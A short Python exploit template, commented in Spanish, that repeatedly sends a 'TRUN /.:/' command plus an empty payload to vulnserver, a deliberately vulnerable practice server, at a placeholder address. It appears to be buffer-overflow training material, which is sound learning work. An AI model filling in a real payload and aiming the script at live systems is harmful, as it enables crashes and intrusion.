import sys, socket

#Este script esta diseñado para vulnserver

payload=""

ip="10.0.0.0" #Cambia la direccion IP a la que necesites
port=5555 #Cambia el puerto al que necesites

while True:
        try:
            s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            
            s.send(bytes("TRUN /.:/" + payload,"latin-1")) #El string de TRUN puedes cambiarlo a otro comando si quieres
            s.close()
          
        
        except:
                print("Error conectando al servidor")
                sys.exit(0)